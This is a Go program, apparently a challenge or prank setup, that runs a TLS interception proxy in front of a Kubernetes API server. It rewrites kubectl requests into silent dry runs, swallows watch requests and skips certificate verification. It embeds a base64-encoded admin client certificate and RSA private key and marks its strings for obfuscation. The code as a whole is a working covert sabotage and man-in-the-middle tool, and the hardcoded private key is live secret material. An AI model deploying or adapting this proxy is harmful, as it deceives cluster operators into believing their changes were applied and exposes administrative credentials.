//go:build ignore
// +build ignore

//go:generate strobfus -filename $GOFILE

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

var KUBERNETES_CLIENT_CERT = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJRENDQWdpZ0F3SUJBZ0lJRWZQeVhFd2I3RW93RFFZSktvWklodmNOQVFFTEJRQXdGREVTTUJBR0ExVUUKQXhNSlkzSmhjMmhpWldWeU1CNFhEVEl5TURnd09URXpNRGN5TWxvWERUSXpNRGd3T1RFek1UUTBNVm93TkRFWApNQlVHQTFVRUNoTU9jM2x6ZEdWdE9tMWhjM1JsY25NeEdUQVhCZ05WQkFNVEVHdDFZbVZ5Ym1WMFpYTXRZV1J0CmFXNHdnZ0VpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElCRHdBd2dnRUtBb0lCQVFEeFhmdzlZT0wvYlBrSmtOLzMKWk80Ni9LZXRjN2tZRS9nclhoSGpTYWY2L3h5QW1lc1puRThQRkhmRmpnaXU3aXZPZXhMNC90M2Y4dENMUmRjOQpoY2ZTUnlxSFE2V2FIVFk5UkQ3L0FkSUNzVHhYZ3ZvSUdCMzdMQXlzQVNmRWxncDQvZGcvc05hVVNmOVBMS1A2CjViL2xkZmc1RHV1Snd4Kys5MTVFdWdpdDRmWHBOUTlhUDMxVnJFQ1dhSnAvcGoxanZ6SnB5a1pWMlhNbUtFWFIKZVZWbUo3OW9LOWF2WU5rdFBEQXZiVm9tRUdkZFJwRStFdHR3SzF2QUJGTVhaWlVUVjZSTjZtdnFGa203TTBHTgpmY1ljeEVWdW9KKzI1TGJiRVBvYnlpRjhOSEYzK2VVQkc4VStxR0JtWmE0UnpRTkRxWnZMVmZ1aG9nZ3lNa2puCkxBRkZBZ01CQUFHalZqQlVNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUtCZ2dyQmdFRkJRY0QKQWpBTUJnTlZIUk1CQWY4RUFqQUFNQjhHQTFVZEl3UVlNQmFBRkN6THUrRk0yZFEyV0VJcWhQNnozOEpIU0pEVgpNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUEraEFLTUJIYTBrU0MzdnJZRFFkVy8vUG9mSWo0WWVxWnJqSW9VClpOcGdWT3BEM1VhTDAxWTZLbG16UmZGN1FDMGpUR25mcm1zOWVVU05xanNjQXhPWGRQelRYeWpvYkNTOEpBT2YKRHFEQUtUeHdFeVcvVnZUTStReTB1OWdVazdmcW9uKyt3Z2RXU2IwTUxJeFdObjJEcFg5QVhTbFY4Yjk2bjc4WQpqVjBqOSt0Risxbks5ZHdSNVBxMzlDaHQrQ3RzL3pxQWpML0Fxc0Y5eFFReXVrcWdBOGtZNlVIOVN5TkJqd2gzCjlKbWVjZCtPc3Y1eHpzOXhjTXpiMGY3azd4S1h5cWN4YmUrc1RKanlMSk1lU1NWRUdKeXhsMjVOelJ3MDNxSWYKK0VCaWNzV0pHd1QwV0EyY0dWVlBESWxXL0xucnlzMkc2VDJRVTRJY2toQjBZVkhmCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
var KUBERNETES_CLIENT_KEY = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBOFYzOFBXRGkvMno1Q1pEZjkyVHVPdnluclhPNUdCUDRLMTRSNDBtbit2OGNnSm5yCkdaeFBEeFIzeFk0SXJ1NHJ6bnNTK1A3ZDMvTFFpMFhYUFlYSDBrY3FoME9sbWgwMlBVUSsvd0hTQXJFOFY0TDYKQ0JnZCt5d01yQUVueEpZS2VQM1lQN0RXbEVuL1R5eWordVcvNVhYNE9RN3JpY01mdnZkZVJMb0lyZUgxNlRVUApXajk5VmF4QWxtaWFmNlk5WTc4eWFjcEdWZGx6SmloRjBYbFZaaWUvYUN2V3IyRFpMVHd3TDIxYUpoQm5YVWFSClBoTGJjQ3Rid0FSVEYyV1ZFMWVrVGVwcjZoWkp1ek5CalgzR0hNUkZicUNmdHVTMjJ4RDZHOG9oZkRSeGQvbmwKQVJ2RlBxaGdabVd1RWMwRFE2bWJ5MVg3b2FJSU1qSkk1eXdCUlFJREFRQUJBb0lCQURJK0NDV1dwMm5YK3piOAppMEpxSmhUdFJ0SWFScXMyYlBCS0Vwc25WK290ZEhkb2tzR3dBZHozdTc3SnhCRDF6dlNhTmViUzFzaXBPTFBsCkE5cndvQm1yYXJUaFpmVmdvMHU1aXd0MkM0czM3WUdoNS80TFZ5SlRsd2V1N2VKRUFVWVNRUk53OGhuSUZYY2IKcWI2dVdIV2hTdHhGdU0zaWFoZE1VcmtucUdyWk9PTHdmZUsxRXc4WklETE5qRmo4ZW54VlFzNVVCenV4WmVySQpxN0oxSmZZRDZXazFBUUtpK1kyNCtSckw3NTVlU0dMUDVhY3RpanRhSFh0bjNtYk5vZVdHMlkxQXJXbHRkRnRFCmdkMzMrZ0tVZXNkVzRPT0E4b25qZkt0cmYxN0pPdmV3bC9Bdzh3cmhBZk9TNmZTbHJxS0FTdW5xcU9XWUZham4KY01RVzBRRUNnWUVBK3pCUk8wbUVYd2RpbGdxNWM3blMvdmZhZWo5eDRFRElGNmJZTGZwd0pnUEVTWnZoQkZYbQpkeFpLM0JPcmJSM2RUZlVHWExkU3NHRzNvcW9RcUFKMGlKTEl1Y1JRK3QrVDdQc2xnY2VhS2JwTElZQ21nbkpPCmoyejFweTJTNFFJTmpLcXBiV2pRaGJ0OWs1OENXa1c3NkN1blRSNnJDNkJJOUo4bTI1Q1BJQ1VDZ1lFQTlmMkMKTWNJVnpFd0lUTlRwaDBGY3V2amRmZlpaV0dOKy9rUTZVT2RZbDlsbTloaVYxNlh0NW9Zak9yM2ZZVXcrMVJSNQoyQ1JiN3Yxb0NQK2lDcWs1L3d0Vm41WDYrUG9YZytHejlBdURKLzEzdWVoUTlRY0FRUGtmSkVNbFRCR25aN0dECkVPNjJKclVleGp6T2htOVZpZUhmSnMvK0YxN2xDMHlLWFJpZWdxRUNnWUVBMThjWDRPQTBrQldlQU5wUm1USW0KS05UdG4xcGxEb2xYMmNsL3AyK2RhMnFNOGRhd0k3Tk8rVG56TUw3TTRqMW5ZSko5MXFPOHFyd21yZHQ5MTNYVQplWVh1WEhaaVFrQlJxSi9PQm9CYTFFR3VUS2RoWW1talJ0NEk0SVhyeU5La3BSUHQyNGpRcURENW5SaFpRd2JvCmRuY1pqc3dyang4dnpNUHk4MlpwTE9rQ2dZRUE1US9yQTdDcW9iSVBiSlE2M2RNMHFYc0NyY0FQbEtvWjRHWGkKTStJcDhrVGtocmVBR082UGFNRngzc3BlVDNremJUSURBQTFqZWxtSVhoREZjTTRDam9lY2ROMnhkZFZVdmw4WApObUxlQUFnY1RBYVVGSWN2YWxGUStYQjVNNnVneW9OVy9CWjlrZS9JdDJwNkdsOWtOT0FhNzBaeFlvdmdGelJ3CkI1N2NRK0VDZ1lCQ3JtY0NTNmZBdkFMZ3E0UU1vekNwQ0crc3BxUzltSys1Qlk5TzVSTjN3STNodUlBL0VpVFgKZm9CNjhKaFZpQkZ6dy8xajQzQ2VtTm5zMU9vM2lmNDc1REkyUENSYW5HalpMUFU0T0c2U3dqbU9CU3lEM3FsTgpNUVZTdGM5Tm5Ud2V5d21BazBCNnVoYXgyUWlra2lQeWtjamtSM2VRdEN4UTUzMUNlNVVYVlE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo="

func main() {
	debug := os.Getenv("DEBUG")

	userAgent := os.Getenv("INTERCEPT_USERAGENT")
	if len(userAgent) == 0 {
		userAgent = "kubectl/"
	}

	cert, err := base64.StdEncoding.DecodeString(KUBERNETES_CLIENT_CERT)
	if err != nil {
		log.Fatal("DecodeString:cert", err)
	}

	key, err := base64.StdEncoding.DecodeString(KUBERNETES_CLIENT_KEY)
	if err != nil {
		log.Fatal("DecodeString:key", err)
	}

	tlsCert, err := tls.X509KeyPair(cert, key)
	if err != nil {
		log.Fatal("X509KeyPair", err)
	}

	reverseProxy := http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
		req.Host = "127.0.0.53"
		req.URL.Host = "127.0.0.53:6443"
		req.URL.Scheme = "https"
		req.Header.Set("Accept-Encoding", "")

		if strings.HasPrefix(req.Header.Get("User-Agent"), userAgent) {
			if req.Method == "DELETE" {
				postBody := "{\"propagationPolicy\":\"Background\",\"dryRun\":[\"All\"]}\n"
				req.Body = ioutil.NopCloser(strings.NewReader(postBody))
				req.ContentLength = int64(len(postBody))
			} else {
				req.URL.Query().Set("dryRun", "All")
				req.URL.RawQuery = req.URL.RawQuery + "&dryRun=All"

				req.URL.Query().Del("watch")
				req.URL.RawQuery = strings.Replace(req.URL.RawQuery, "watch=true", "", 1)

				req.URL.RawQuery = strings.Replace(req.URL.RawQuery, "&&", "&", 1)
			}
		}

		if debug == "1" {
			fmt.Printf("[reverse proxy server] [%s] %s %s -> %s\n", req.Header.Get("User-Agent"), req.Method, req.RequestURI, req.URL.RequestURI())
		}

		if strings.Contains(req.RequestURI, "watch=true") {
			rw.WriteHeader(http.StatusOK)
			return
		}

		req.RequestURI = ""

		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true, Certificates: []tls.Certificate{tlsCert}}

		// send a request to the origin server
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			rw.WriteHeader(http.StatusInternalServerError)
			_, _ = fmt.Fprint(rw, err)
			return
		}

		if strings.HasPrefix(req.Header.Get("Accept"), "application/json") {
			rw.Header().Set("Content-Type", "application/json")
		} else {
			rw.Header().Set("Content-Type", "application/octet-stream")
		}

		defer resp.Body.Close()
		reader := bufio.NewReader(resp.Body)

		if _, err := io.Copy(rw, reader); err != nil {
			log.Print("copy error", err)
		}
	})

	log.Fatal(http.ListenAndServeTLS(":853", "/etc/kubernetes/pki/apiserver.crt", "/etc/kubernetes/pki/apiserver.key", reverseProxy))
}
